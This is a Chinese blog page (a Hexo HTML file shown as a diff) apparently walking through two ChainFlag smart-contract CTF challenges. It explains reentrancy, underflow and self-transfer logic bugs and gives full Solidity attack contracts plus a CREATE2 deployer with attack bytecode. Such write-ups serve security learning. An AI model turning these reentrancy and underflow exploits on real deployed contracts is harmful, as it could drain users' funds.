@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ChainFlag靶场WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ChainFlag靶场实战（二）">
+<meta property="og:url" content="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
+<meta property="og:site_name" content="lucifer&#39;s blog">
+<meta property="og:description" content="ChainFlag靶场WP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230104224521545.png">
+<meta property="og:image" content="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230104225047390.png">
+<meta property="og:image" content="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230103212940809.png">
+<meta property="og:image" content="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230103213256457.png">
+<meta property="og:image" content="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230103213458396.png">
+<meta property="og:image" content="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230103215026976.png">
+<meta property="article:published_time" content="2023-01-03T13:19:32.000Z">
+<meta property="article:modified_time" content="2023-01-04T14:50:49.317Z">
+<meta property="article:author" content="lucifer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230104224521545.png">
+
+<link rel="canonical" href="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ChainFlag靶场实战（二） | lucifer's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lucifer's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lucifer">
+      <meta itemprop="description" content="知而不行，谓之不诚">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lucifer's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ChainFlag靶场实战（二）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-01-03 21:19:32" itemprop="dateCreated datePublished" datetime="2023-01-03T21:19:32+08:00">2023-01-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-01-04 22:50:49" itemprop="dateModified" datetime="2023-01-04T22:50:49+08:00">2023-01-04</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><a target="_blank" rel="noopener" href="https://chainflag.org/challenges">ChainFlag</a>靶场WP</p>
+<span id="more"></span>
+
+<h1 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h1><h2 id="babybank"><a href="#babybank" class="headerlink" title="babybank"></a>babybank</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230104224521545.png" alt="image-20230104224521545"></p>
+<p>仍然是调用payforflag，需要我们的余额大于10000000000。</p>
+<p>题目很明确标出来了，需要我们完成的三个challenge。</p>
+<p><strong>challenge1</strong>:需要我们的地址后四位为b1b1,creat2即可</p>
+<p><strong>challenge2</strong>:猜对secret的值，我猜他的本意是考察web3查询隐私链上数据，但由于未初始化，输入0即可</p>
+<p><strong>challenge3</strong>:不难看出<code>withdraw</code>中存在先发钱后改值，也就是经典的重入漏洞，故我们只需要进行重入<code>withdraw</code>让余额发生下溢即可。</p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line">import &quot;./babybank.sol&quot;;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    babybank public bank;</span><br><span class="line">    bool public isWithdraw;</span><br><span class="line">    function setBank(address _addr)public&#123;</span><br><span class="line">        bank = babybank(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function challenge1()public&#123;</span><br><span class="line">        bank.profit();</span><br><span class="line">    &#125;</span><br><span class="line">    function challenge2()public&#123;</span><br><span class="line">        bank.guess(0);</span><br><span class="line">    &#125;</span><br><span class="line">    function challenge3()public&#123;</span><br><span class="line">        bank.withdraw(2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function complete()public&#123;</span><br><span class="line">        bank.payforflag(&quot;chainflag&quot;,&quot;babybank&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()external payable&#123;</span><br><span class="line">        if(!isWithdraw)&#123;</span><br><span class="line">            isWithdraw=true;</span><br><span class="line">            bank.withdraw(2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>creat2合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract deployer&#123;</span><br><span class="line">    bytes attackCode = hex&quot;608060405234801561001057600080fd5b50610635806100206000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063090d23b914610160578063522e1177146101a35780635619253b146101ba5780636c0c816c146101d157806376cdb03b146101e8578063dbae172c1461023f578063e64174ad1461026e575b600060149054906101000a900460ff16151561015e576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60026040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561014557600080fd5b505af1158015610159573d6000803e3d6000fd5b505050505b005b34801561016c57600080fd5b506101a1600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610285565b005b3480156101af57600080fd5b506101b86102c8565b005b3480156101c657600080fd5b506101cf6103dc565b005b3480156101dd57600080fd5b506101e6610487565b005b3480156101f457600080fd5b506101fd610526565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561024b57600080fd5b5061025461054b565b604051808215151515815260200191505060405180910390f35b34801561027a57600080fd5b5061028361055e565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638c0320de6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808060200180602001838103835260098152602001807f636861696e666c61670000000000000000000000000000000000000000000000815250602001838103825260088152602001807f6261627962616e6b00000000000000000000000000000000000000000000000081525060200192505050600060405180830381600087803b1580156103c257600080fd5b505af11580156103d6573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639189fec160006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561046d57600080fd5b505af1158015610481573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166366d16cc36040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561050c57600080fd5b505af1158015610520573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060149054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60026040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156105ef57600080fd5b505af1158015610603573d6000803e3d6000fd5b505050505600a165627a7a72305820ec1c2f91961885358dbf8f749f3fee968ad10e60e3cce37032a7a37bc93dfdc30029&quot;;</span><br><span class="line">    function deploy(bytes32 salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>依次调用三个challenge函数和complete函数即可完成攻击。</p>
+<p><img src="/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230104225047390.png" alt="image-20230104225047390"></p>
+<h2 id="h4ck"><a href="#h4ck" class="headerlink" title="h4ck"></a>h4ck</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230103212940809.png" alt="image-20230103212940809"></p>
+<p>要求我们调用这个函数，也就是<code>sellTimes</code>大于100.</p>
+<p>看完合约能发现合约存在两个Bug:</p>
+<p>1.<em>transfer中存在逻辑漏洞，如果</em><code>_from</code>和<code>_to</code>相同，那么就会给同一地址凭空增加<code>_value</code>的余额.</p>
+<p><img src="/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230103213256457.png" alt="image-20230103213256457"></p>
+<p>2.sell中存在重入漏洞，可通过fallback重复调用sell函数。</p>
+<p><img src="/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230103213458396.png" alt="image-20230103213458396"></p>
+<p>思路到这里就很清晰了。</p>
+<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line">import &quot;./h4ck.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attck&#123;</span><br><span class="line">    challenge public cha;</span><br><span class="line">    bool public isSell;</span><br><span class="line">    constructor(address _addr)public&#123;</span><br><span class="line">        cha = challenge(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    function buy()public payable&#123;</span><br><span class="line">        cha.buy.value(1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trans()public&#123;</span><br><span class="line">        uint256 temp=1;</span><br><span class="line">        for(uint i=0;i&lt;10;i++)&#123;</span><br><span class="line">            cha.transfer(address(this),temp);</span><br><span class="line">            temp*=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell()public&#123;</span><br><span class="line">        cha.sell(100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function complete()public&#123;</span><br><span class="line">        cha.winnerSubmit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function()external payable&#123;</span><br><span class="line">        if(!isSell)&#123;</span><br><span class="line">            isSell=true;</span><br><span class="line">            cha.sell(100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先调用buy函数，获得初始的1余额，随后进行循环的transfer为合约增加一千余额，为后面的攻击做准备。</p>
+<p>随后调用sell函数并在fallback中再次调用sell函数即可让sellTimes发生下溢，使其变得很大，从而完成<code>winnerSubmit</code>的条件，调用complete即可完成攻击。</p>
+<p><img src="/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20230103215026976.png" alt="image-20230103215026976"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>lucifer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/01/03/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89/" title="ChainFlag靶场实战（二）">http://example.com/2023/01/03/ChainFlag靶场实战（二）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" rel="prev" title="ChainFlag靶场实战（一）">
+      <i class="fa fa-chevron-left"></i> ChainFlag靶场实战（一）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Reentrancy"><span class="nav-number">1.</span> <span class="nav-text">Reentrancy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babybank"><span class="nav-number">1.1.</span> <span class="nav-text">babybank</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#h4ck"><span class="nav-number">1.2.</span> <span class="nav-text">h4ck</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lucifer</p>
+  <div class="site-description" itemprop="description">知而不行，谓之不诚</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lucifer</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">223k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:23</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
